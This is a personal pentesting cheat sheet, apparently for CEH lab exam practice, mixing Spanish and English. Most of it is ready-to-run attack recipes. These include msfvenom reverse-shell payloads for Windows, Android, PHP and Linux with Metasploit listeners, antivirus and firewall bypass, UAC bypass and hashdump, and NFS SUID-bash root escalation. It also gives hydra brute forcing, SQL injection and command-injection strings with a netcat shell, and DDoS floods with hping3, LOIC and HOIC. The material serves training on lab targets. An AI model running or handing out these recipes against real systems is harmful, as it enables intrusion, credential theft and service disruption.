Route –n 
Host file sudo nano /etc/hosts 
TTL (64 Linux and 128 Windows) 

pagina linux gtfobins.github.io

Footprinting 
Google Dock 
filetype, site, intitle, inurl, cache, allinurl, allintitle, link, info, related, location... 
Examples of queries: 
EC-Council filetype:pdf 
intitle:login site:eccouncil.org 
More examples in:  
ExploitDB 

wordlist 
/usr/share/seclists/Discovery/web-content/directory-list-2.3-medium.txt


dirb  
dirb http://target 
Go buster 

Forzar subdominios  
Gobuster vhost –u https://futurevera.thm –w /usr/share/seclist/Discovery/DNS/subdomains-top1million-20000.txt5 –k 
append-domain 
gobuster dns -d mysite.com -t 50 -w common-names.tx 
gobuster dir -u https://mysite.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x 
.php,.html 
gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt 


Tcpdump 
sudo tcpdump ip proto \\icmp -i ens5 -C 1 
Dom subdominios certificadoss - https://crt.sh busqueda de dominios  - https://ui.ctsearch.entrust.com/ui/ctsearchui   busqueda de certificados vencidos - https://search.censys.io/   busqueda de dominios y certificados 


Enumeración 
Nmap –sn –T4 172.16.3.2/24 host vivos 
Nmap –T4 172.16.4.3/24   ( encontrar algún puerto en especifico abierto en la red) 
Nmap –p 53 –T4 10.10.10.0/24  enonctrar la ip de DM 
Nmap   -T4 –A 10.10.10.25  ident netbios 
Nmap  -T4 –A –sV 10.10.10/25   version de openssh 
Nmap –T4 –sV 192.24.244.2/24 servicios versiones en la red 
nmap -T4 -A -p 389,636,3268,3269 192.168.x.1/2x 
nmap -p 389 --script ldap-rootdse <target_IP> 
nmap -T4 -A 192.168.x.2/2x 
nmap -T4 -A -p 80,443 192.168.x.x/2x 
nmap -T4 -A -p 139,445 192.168.x.3/2x3 
nmap -p 139,445 -sV 192.168.x.x/2x 


Dnsenum 
dnsenum  www.certifierd.com 
dnsenum --dnsserver IP --enum -p 0 -s 0 -o subdomains.txt -f 
/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt domain.com 


Ffuf  
Find subdirectories: ffuf -w pathWordlist:FUZZ -u https://target/FUZZ  
Parameter fuzzing:  
ffuf -w -u -fc 401 POST parameter fuzzing: ffuf -w /path/to/postdata.txt -X POST -d 
"username=admin\&password=FUZZ" -u https://target/login.php -fc 401  
subdomains: 
ffuf -w -u -H “Host: FUZZ.website.com”  
extensions:  
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u 
http://SERVER_IP:PORT/blog/indexFUZZ  
files with extension php:  
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3 small.txt:FUZZ -u 
http://SERVER_IP:PORT/FUZZ.php 
Find parameters: 
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 
'http://SERVER_IP:PORT/index.php?FUZZ=value' 
LFI with that parameter found: 
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 
'http://165.22.118.93:30678/index.php?view=FUZZ' -fs 1935  
Filter by size or by code to see the different ones:  
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 
'http://SERVER_IP:PORT/index.php?FUZZ=value' -fs 2287 * Parameter ‘fc’ status code and ‘fs’ response 
size. 


Zona transfer 
Identifying nombressercvers 
nslookup -type=NS zonetransfer.me  
probar zona transf 
dig axfr @IP domain.com 


Escaneo 
netdiscover -i eth0 — This will help me to get the machines available on our network 
Arp-scan  -I ens33  --localnet 
Nmap   
Nmap –sN 10.10.0.0/24 
Nmap –p- -T5 –sT  --open 192.168.111.1 –v –n 
Nmap –p22 192.168.111.1 –- mtu 8 firew 
Nmap –- script vuln  ip 
Nmap –sC  -sV –oN escaneo_inicial.txt <ip>   / escaneo inicial  
Nmap –sC –sV –p80,79 (puertos abiertos) –oN  escaneodetallado.txt (ip) / escaneo sobre puerto 
Nmap  -A –T4 –oN escaneo_Int.txt 192.168.1.0/24    / escaneo intense  
Nmap –A –T4 –p- --script vuln –oN intense_scan.txt –v 192.168.1.0/24   / intenso scan complete 
Nmap –A –T4 –p- --script vuln –oN wide_networkscan.txt –v 192.168.1.0/16  / escanearia de 192.168.0.0 a 
192.168.255.255  
Nmap –A –T4 –p- --script vuln –oN multired_scan.txt –v 192.168.1.0/24 10.0.0.0/24  / intenso scan complete 
Nmap –T5 –sS –sV –O (Ip)  ss sigiloso, sv version 
sudo nmap –sS -T4 -A 10.10.100.144 
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10 

Uniscan ETag
uniscan -u movies.google.com
Curl -I 192.168...

wpscan --url http:// .....com/wp-login.php -U ./username.txt -P ./password.txt

Telnet 
telnet Ip 22 
nmap –sS –sV –p- -O IP  
Nmap banner servicios  
Nmap –sV –script=banner 192.168.1.20.22 
.HELP 
.RUN ping 


Conexion ssh  
Ssh admin@192.168.1.22 / simple 
Ssh –p 2222 admin@192.168.1.10 /  Puerto  
Ssh –i /ruta/a/tu/clavepriva admin@192.168.1.10 / con clave privada 
Ssh –i id_rsa usuario@IP 

ssh -i key.pem admin@10.10.170.80
ssh -i key.pem john@10.10.170.80

FTP21 
ftp 10.10.223.330  
hydra -l mike -P /usr/share/wordlist/rockyou.txt -v 10.10.223.20 ftp

SMB22
sudo nmap --script smb-os-discovery.nse IP
sudo nmap -p445 --script smb-os-discovery.nse 192.168.18.110
cd /usr/share/nmap/scripts; ls| grep smbpython3 dirsearch.py ​​-u http://www.moviescope.com -x 403
enum4linux [options] ip -U             
get userlist -M             -N             -S             -P             -G             -a             
get machine list 
get namelist dump (different from -U and-M) 
get sharelist 
get password policy information 
get group and member list 
all of the above (full basic enumeration) 
Smbclient //Ip/(share) 
Ls  
More 
Get 
Chmore 600 
msf > use auxiliary/scanner/smb/smb_version 


Ldapsearch 
Ldapsearch –x –h 10.10.10.25 –b “DC=CEHSORDORG, DC=com” “objectclass=user”  
netcad 
nc –lvnp 444 
nc –lvp 444 
Banner Grabbing  
Netcat  
Nc (IP) Puerto   /  nc 192.168.1.20 80 
GET /HTTP/1.1 
Host:192.168.1.20\ 


Wireshark 
http://testphp.vulnweb.com/
filtros
http.request.method==POST  .... credenciales 
ftp ..... ftp 
tcp.flags.syn==1 and tcp.flags.ack==0    .... DDOS
tcp.flags.syn==1 and tcp.flags.ack==0     ..... DDOS
tcp.flags.syn ==1 
mqtt
Wireshark captura.cap  
Vulnerabilidades 
Consulta de vulnerabilidades 
Exploit-db 
Vuldb.com 
Cve.mitre.org 
Vulners.com 
Cve.circl.Iu -- 
Gvm-start 
Open web  
127.0.0.1:9392 


Hydra 
hydra -l USER_NAME -P password_file TARGET_IP smb 
smbclient //target_ip/ -U USER_NAME  
get file.txt 
smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt' 
Decrypt Encoded File 
bctextencoder 
snow.exe -C -p “pass” file.txt 


netbios  
cmd 
nbtstat –
nbstat –c 
net use  
nmap -sU -p 137 --script nbstat.nse 192.168 ....


snmp walk 
snmpwalk –v1 –c public IP 
snmpwalk –v2 –c public IP 
Billcypher coordenadas 
Python3 billcipher.py 

Dig  
Dig www.certifiedhacker.com axfr zona transfer 


Metasploit  
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe (optional -e x86/shikata_ga_nai -b "\x00") LHOST=IP 
LPORT=PORT -o RUTA 
use multi/handler , set payload windows/meterpreter/reverse_tcp 
msfvenom 
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.60.2 LPORT=444 
Msfvenom –p Windows/meterpreter/reverse_tcp - - platformwindows –a x86 –f exe LHOST = ip nostra LPORT=444 –o 
/home/attacker/Desktop/Test.exe  
Crear directorio para compartir el document0 al navegador  
Mkdir /var/www/html/share 
Chmod –R 755 /var/www/html/share 
Chown –R www-data:www-data /var/html/share 
Cp /home/attacker/Desktop/Test.exe /var/www/html/share 
service apache2 start 


msfconsole  
use  exploit/mulit/handler 
set payload 
windows/meterpreter/reverse_tcp 
set LHOST 10.10.1.13 
set LPORT 444 
exploit  
Abrir el navegador en la Windows 11 10.10.1.13/share 
Ejecutar test.exe 
Una vez dentro  
En parrot  
Sysinfo 
Sessions –i 1 
upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  detectar escalar privilegios 
Shell  
Powershell –ExecutionPolicy Bypass –Command “ . . \PowerUp.ps1;Invoke-Allchecks” 
Exit  
Run vnc  


Escalar Privilegios  
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" 
LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe 
Generar la carpeta para compartir  
Mkdir /var/www/html/share 
Chmod –R 755 /var/www/html/share 
Chown –R www-data:www-data /var/www/html/share 
Cp /home/attacker/Desktop/Exploit.exe /var/www/html/share 
Service apache2 start 
Msfconsole  
Use exploit/multi/handler 
Set Payload windows/meterpreter/reverse_tcp 
Set LHOST 10.10.1.13 
Exploit –j –z  
Windows 11, explorador ejecutar el archive  
Regresar y tenemos sesión de meterpreter 
sessions –i 1 
getuid 
escalar privilegios con Be root  
subir el archivo Beroot.exe  
upload /home/attacker/Desktop/beRoot.exe 
shell 
beRoot.exe 


Escalacion privilegios NFS2049 
Sudo apt-get update 
Sudo apt install nfs-kernel-server 
Nano /etc/exports 
Nmap –sV –script=nfs-showmount 192.168.1.120 
Apt-get install nfs-common 
Shawmount –e 192.168.1.2 
Verificar nuestro privilegios  
Run post/windows/gather/smart_hashdump ( de no ser exitoso seguir) 
getsystem –t 1 
Background 
use exploit/windows/local/bypassuac_fodhelper  
show options 
set SESSION 1  
set payload windows/meterpreter/reverse_tcp 
set LHOST 10.10.1.13 
set LPORT 4444 
set TARGET 0 
exploit  
getuid 
getsystem –t 1 
hashdump 
run post/windows/gather/smart_hashdump 
hashes ntlm 

Ninja Jonin control remoto atrás de cualquier nat firewall y proxy 
La versión 1.1 es a la escucha  
Y la versión 2 se modifica el archivo config con la ip  
Se pasa por red a la otra maquina 
Se abre primero el 1.1 quien escucha se da un click  
Y depues abre al que se escuchara 2.1  
Una vez dentro en el 2  
List  
Connect 1 
Change 
Cmd 
Ifconfig 
Msfvenom directorio en red 
Msfvenom –p android/meterpreter/reverse_tcp LHOST=1010101 R > /var/www/html/share/ test.exe 


Escalacion nfs 
Sudo apt update 
Sudo apt install nfs-kernel-server 
Sudo nano /etc/exports 
/home 
*(rw,no_root_squash) 
Guarder salir  
Sudo /etc/init.d/nfs-kernel-server restart 
Parrot nmap –sV 10.10.1.9  
Detector 2049 nfs abierto 
Sudo apt-get install nfs-common 
Showmount –e 10.10.1.9 
Sudo nmap –sV –script=nfs-showmount 10.10.1.9 
Mkdir /tmp/nfs 
Sudo mount –t nfs 10.10.1.9:/home /tmp/nfs 
Cd /tmp/nfs/ 
Sudo cp /bin/bash . 
Chmod +s bash 
Ls –la 
Sudo df –h 
Otra term  
Ssh ubuntu@10.10.1.19 
Whoami 
Cd /home 
Ls –la 
./bash –p 
Id 
Whoami 
Nano /etc/shadow ---------- 


DDOS 
Primero mapear el Puerto con nmap –p puerto IP, si esta abierto continuar 
Metasploit DDOS Synfloat FTP 
Msfconsole  
use auxiliar/dos/tcp/synflood 
 Establezca RHOST (dirección IP de destino) (aquí, 10.10.1.11 ) 
 Establecer RPORT 21 
 Establezca SHOST (dirección IP falsificable) (aquí, 10.10.1.19 ) 
Hping3 
hping3 -S (Dirección IP de destino) -a (Dirección IP falsificable) -p 22 –flood 
A PoD 
hping3 -d 65538 -S -p 21 --flood (Dirección IP de destino) -d : especifica el tamaño de los datos; -S : establece el indicador SYN; -p : especifica el puerto de destino; y -
flood : envía una gran cantidad de paquetes. 
A inundación en capa de aplicación UDP 
hping3 -2 -p 139 --flood (Dirección IP de destino) -2 : especifica el modo UDP; -p : especifica el puerto de destino; y --flood : cantidad de paquetes. 

CharGEN (Puerto 19) 
SNMPv2 (Puerto 161) 
QOTD (Puerto 17) 
RPC (Puerto 135) 
 
 
 
 
 
 
 
SSDP (Puerto 1900) 
CLDAP (Puerto 389) 
TFTP (Puerto 69) 
NetBIOS (Puerto 137,138,139) 
NTP (Puerto 123) 
Protocolo de red Quake (puerto 26000) 
VoIP (Puerto 5060) 


Raven-storm DDOS 
Sudo rst 
L4 
Ip 10.10.1.19 
Port 80 
Threads 20000 
Run 
Y 

HOIC –DDOS HOIC (High Orbit Ion Cannon) 
Abrir HOIC windows 
Poner la ip en la ur cosiderando http://10.10.1.13 
Subir la barra a potencia alta  
En booster  Genericboost.hoic y agregar  
Cargar en todos las maquinas con las que se atacara 
Y dar en el botón fire teh lazer! 

LOIC - DDOS (Low Orbit Ion Cannon) principalmente dirigido a aplicaciones web\ 
Abrir Loic Windows  
Poner la ip o la url  
Click en lock on 
Seleccionar udp 
5- 10 en el subproceso 
Barra energía a la mitad 
Y dar en IMMA Chargin 
Users 


Responder 
Sudo responder –I eth0 
Toor 
Registros almancenados /usr/share/responder/logs 
Cop hash 
John hash.txt 
comp. tar cvf archivo.tar /archivo/carpeta/* 
desc tar xvf archivo  

L0phtCrack 
Wizard 
Remote host smb 
Host Ip  
Specifi credentials 
Dominio  
Throught pass audit 
Run  

Version FQDN 
nmap -p 389 -sV -iL OR nmap -p 389 -sV {FQDN = Host + Domain} 
type ldapsearch -h [Target IP Address] -x -s base namingcontexts  -x: specifies simple authentication,  -h: specifies the host 
, and  -s: specifies the scope. 
After getting the domain name e.g. CEH.com  
Type  ldapsearch -x -h -b “DC=CEH,DC=com” and press enter  
Buscar version 
elfnmap -sV -p 5555 192.168.x.4/2x 
adb connect TARGET_IP:5555 
Access mobile device:  
adb shell  
pwd  
ls 
cd  
sdcard/scan  
ls  
cat secret.txt 
adb pull /sdcard/scan  
sudo -i 
ent file.elf 
sha384sum file.elf  


Vulnerabilidades 
RDP 
Sudo nmap -sV ip/24 
Sudo nmap –p 3389 ip/24 
Hydra-l user –P path password.txt Ip rdp 
Remmima – Rdesktop 
Rdesktop – u     
nmap -T4 -A 192.168.x.6/2.x 
nmap -T4 -A -p 80,443 192.168.x.x/2x 
hydra -L username_file -P password_file TARGET_IP telnet 
hydra -L username_file -P password_file TARGET_IP ssh 

DVWA


Stego 
https://stegonline.georgeom.net/upload
Select Extract Data 
Upload file and select path of destination 
Use any pointer from the question as keyword where applicable 
Click to Extract Data 
nmap -p 21 192.x.x.8/24 
hydra -L username_file -P password_file 192.168.0.x ftp 
ftp 192.168.0.x 
Retrieve file: 
get file 
View Content: 
cat file 

SNOW
http://darkside.com.au/snow
SNOW.EXE -C -m "hasan is my name" -p " magic" test.txt test2.txt
-m mensaje a ocuptar
-p passw
test.txt fila original 
test2.txt is la fila objetivo 

Descifra
SNOW.EXE -C -p "magic" test2.txt


Nikto
nikto -h | view command help| -H for full help text
nikto -h http://www.goodshopping.com -Tuning 1 |-Tuning 1 Scan tuning  1=Interesting File / Seen in logs
---
nikto -h movies.ceorg.com   para encontrar servidor 


zaproxy
http://movies c.com 

Exploiting misconfigured NFS (port 2049) 
* `nmap -sV —p 2049 IP9/Subnet` 
* `sudo apt-get install nfs-common` 
* `nmap -sV —script=nfs-showmount <Target_IP>` 
* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory 
* `mkdir /tmp/nfs` 
* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs` 
* `cd /tmp/nfs` 
* `sudo cp /bin/bash .` 
* `sudo chmod +s bash` -> it will be highlighted in red 
* `ls -la` 
* `sudo df -h` 
* `sudo chmod +s bash` 
after them, In another terminal: 
* Access to target using SSH 
ssh smith@192.168.0.x 
* `./bash -p` and we're root! 
* `cd /home` 
* `ls -la` 
* Find the flag: `find / -name "*.txt" -ls 2> /dev/null` 

whatweb 
nmap -sV --script=http-enum [dominio de destino o dirección IP]
gobuster dir -u [Sitio web de destino] -w /home/attacker/Desktop/common.txt

cd dirsearch/ enumeracion directorios sitio web
python3 dirsearch.py ​​-u http://www.moviescope.com
 python3 dirsearch.py ​​-u http://www.moviescope.com -e aspx
python3 dirsearch.py ​​-u http://www.moviescope.com -x 403
Aircrack 
aircrack-ng -b <bssid from wireshark> -w <path to word list> < pcap file> 
Crypto  
Hashes.com 
veracrypt 

Parameter Tampering and XSS
•	Change id parameter in profile to view other profiles.
•	For XSS, type the script in comments field in contact page. (This is stored XSS and will be shown to every user who views the contact tab)

WPScan and Metasploit – Enumerating and Web App Hacking
•	Use wpscan --url http://[IP Address of Windows Server 2012]:8080/CEH --enumerate u | enumerate user list
•	In msfconsole use auxiliary/scanner/http/wordpress_login_enum
•	Type set PASS_FILE /root/Desktop/Wordlists/Passwords.txt
•	Type set RHOSTS [IP Address of Windows Server 2012]
•	Type set RPORT 8080
•	Type set TARGETURI /CEH/ or complete URL
•	Type set USERNAME admin and press Enter to set the username as admin.
•	Type run
•	Use URL http://[IP Address of Windows Server 2012]:8080/CEH/wp-login.php to login.

Remote Command Execution - Exploiting Vulnerability in DVWA
•	http://10.10.10.12:8080/dvwa | gordonb:abc123
•	Set Security settings to low
•	| hostname
•	| whoami
•	| tasklist
•	| dir C:\
•	| net user
•	| net user <username> /add | add custom user
•	| net user <username>
•	| net localgroup Administrators <username> /add | add user to admin group

VEGA -Web Application Audit (Kali)
•	Open from Web application analysis
•	Start New Scan
•	Enter URL http://10.10.10.12:8080/dvwa 
•	Select all modules
•	Leave rest settings as default and start.
Acunetix WVS (Windows)
•	Install with password qwerty@1234 and port 13443
•	Add target. http://www.moviescope.com
•	Run Full Scan with OWASP 2013 report.
•	

File Upload Vulnerability – All Levels DVWA
Payload Creation
•	msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw | create a raw php code
•	Copy the code in a text file and save as .php
Low Level Exploitation
•	Upload the file | note the path /dvwa/hackable/uploads/<filename>.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.
Medium Level Exploitation
•	Rename file as <filename>.php.jpg
•	While uploading, intercepting with burp and rename back to <filename>.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.
High Level Exploitation
•	Open the <filename>.php file and add code GIF98 at start and save file as <filename>.jpg
•	Upload file
•	Now go to command execution tab and use command <Some IP>||copy C:\wamp64\www\DVWA\hackable\uploads\<filename>.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.

SQL INJECTION
Manual Injection 
•	‘ or 1=1 -- | for login bypass
•	‘insert into login values ('john','apple123'); -- | create own user in the database
•	‘create database mydatabase; -- | create database with name of mydatabase
•	‘exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- | execute ping on moviescope

N-Stalker Free X - Web Application Security Scanner
•	Open tool, Enter URL http://www.goodshopping.com and select OWASP Policy, Click Start Scan Wizard.
•	Leave Settings as default and start session.
•	Start scan. Wait for scan to complete to view results.

SQLMAP
•	Login into website, Get user session cookie via document.cookie is console.
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> --dbs
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> --tables
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> -T <table name> --columns
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> -T <table name> --dump
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> --os-shell


CLOUD COMPUTING
Using owncloud
•	Hosted at ubuntu machine http://10.10.10.9/owncloud. admin:qwerty@123
•	Create users and share files to users.
•	Install Desktop client and share and view files
ClamAV Protection of cloud
Cloud is currently protected by ClamAV so no malicious file is uploaded.

Bypassing ClamAV
•	msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf | generate a linux based executable
•	Type use multi/handler
•	Type set payload linux/x86/shell/reverse_tcp
•	Type set LHOST 10.10.10.11
•	Type set LPORT 4444
•	Type run
•	Upload payload in shared folder.
•	Download using admin, Set permission to chmod -R 755 exploit.elf
•	Execute exploit ./exploit.elf
DOS Attack using Slowloris.pl script
•	Open Slowloris folder 
•	Run chmod 777 Slowloris.pl
•	Execute script ./solaris.pl -dns 10.10.10.9
•	DOS attack successful

CRYPTOGRAPHY
HASHCALC
Easy to use GUI based. Supports text and files

MD5 CALCULATOR
Easy to use, integrates with explorer right click. Right Click any file and select MD5 Calculator to calculate its MD5 Hash.

CRYPTOFORGE
•	Install and it will appear as an encrypt when right clicking on files.
•	To Encrypt open cryptoforge text and enter your text here and use a passphrase to encrypt

BCTEXTENCODER
Simple GUI based. Enter text and encode it using password.

CREATING SELF-SIGNED CERTIFICATE
•	Open inetmgr
•	Click machine name and select Server Certificates
•	From actions select Create Self signed Certificate
•	Choose Name and Personal.
•	Go to a Site, choose Bindings from the Action pane.
•	Select Add.
•	Select Https, IP 10.10.10.16, hostname www.goodshopping.com, select the certificate.
•	Go the site and right click refresh one time.

VERACRYPT - DISK ENCRYPTION
Create Encrypted containers which can be mounted as Virtual Disks.
Creation
Create Volume  Create an Encrypted File Container  Standard VeraCrypt volume  Volume Location (Path to save the container)  Encryption AES Hash SHA-512  Size of Volume  Enter Password  Generate mouse randomness  Format Exit
Mount Volume
Select Drive Letter  Select File  Mount  Enter Password  Disk shown in Explorer

CrypTool – Data Encryption
File  New  Enter Text  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Encrypt
File  Open  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Decrypt


HACKING MOBILE PLATFORMS
Generating and Executing Payloads for Android
Setup Android
•	Open terminal, run su
•	Run ip addr add 10.10.10.69/24 dev eth0
Generate Payload
•	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk | R raw
•	Host the payload and run a listener on Kali
•	Type use exploit/multi/handler.
•	Type set payload android/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit -j -z
•	Browse link of file to start meterpreter session.
Exploit Execute
•	Open kali hosted link. Download APK using es file downloader. Install and run.


Extras

Metasploit – Firewall Bypass
•	Turn on firewall on victim machine
Payload Setup
•	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe | -e encoder, -b list of bad characters to avoid
•	Type mkdir /var/www/html/share | make directory
•	Type chmod -R 755 /var/www/html/share | change rights recursively to all files and folders inside
•	Type chown -R www-data:www-data /var/www/html/share | change owner recursively  owner:group
•	mv /root/Desktop/Test.exe /var/www/html/share | move to exploit
•	service apache2 start

Listener Setup
•	Type use exploit/multi/handler.
•	Type set payload windows/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit -j -z |exploit -j -z exploit tells Metasploit to start the exploit. The -j flag tells it to run in the context of a job and -z simply means to not interact with the session once it becomes active.
Execute Exploit
•	Open http://10.10.10.11/share on victim machine. Download Payload and run.
•	Type sessions -i to view sessions 
•	Type sessions -i 1 to interact with the session created 
•	Type execute -f cmd.exe -c -H | creates a channel to execute the victim command shell
•	Now Type shell | opens an interactive shell (cmd)
•	Type netsh firewall show opmode | to shown firewall stats
•	Type netsh advfirewall set allprofiles state off | to turn off firewall.
•	Type getsystem 
•	Type ps | processes

Dvwa
&& ls
& ls
; ls
| ls
&& nc -c sh 127.0.0.1 9001


john 
RSA private
ssh2john key.txt > hash.txt
john hash.txt -w=/usr/share/wordlists/john/lst
john hash.txt --show
john hash.txt -w/usr/share/wordlists/rockyou.txt

escalar privilegios 
sudo -l
cat /etc/passwd
seleccionar  y copiar 
nano passwd
pegar 
ctrl s
ctrlx
sudo cat /etc/shadow
Seleccionar y copiar
nano shadow
pegar 
ctrl s ctl x
unshadow passwd shadow > pwd.txt
john pwd.txt -w=/usr/share/wordlists/jhon.lst

Su root
cd /root
ls
cat root.txt


Clickjacking 
clickjack github
git clone https... 
cd clickjack 
chmod +X*
python3 clickjack.py www.gooshopong.com

wathweb www.certifiedhacker.com version de nigx
















